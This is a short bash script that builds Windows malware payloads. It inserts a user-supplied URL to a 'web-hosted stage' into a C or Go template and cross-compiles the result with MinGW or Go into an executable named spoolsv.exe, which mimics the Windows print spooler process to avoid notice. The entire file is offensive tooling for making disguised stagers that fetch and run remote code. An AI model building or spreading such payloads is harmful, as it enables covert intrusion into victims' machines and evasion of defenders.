#!/usr/bin/env bash

if [[ $# -eq 0 ]] ; then
	echo 'Usage: ./generate_payload.sh [TEMPLATE]'
	exit 0
fi

echo Enter URL pointing to the stage file \(example - https://www.URL.com/web-hosted-stage.txt\) leave blank if stageless template
read url


## Script supports compiling C with MinGW or Go with GoLang
# Check template extention, compile accordingly
if [[ $1 == *.c ]] ; then
	if [ ! -f /usr/bin/i686-w64-mingw32-gcc ]; then
		echo "Must have MinGW installed to compile C"
		echo "to install: apt install mingw-w64"
		exit 0
	fi
     
	# create a template
	sed -e "s~<URL>~$url~" ./$1 > ./spoolsv.c
	# compile to exe 
	i686-w64-mingw32-gcc spoolsv.c -o spoolsv.exe
	echo "Payload generated - spoolsv.exe"

elif [[ $1 == *.go ]] ; then
	if [ ! -f /usr/bin/go ]; then
		echo "Must have GoLang installed to compile Go"
		echo "to install: apt install golang-go"
		exit 0
	fi
    
	# create a template
	sed -e "s~<URL>~$url~" ./$1 > ./spoolsv.go
	# compile to exe
	env GOOS=windows GOARCH=386 go build spoolsv.go
	echo "Payload generated - spoolsv.exe"
fi
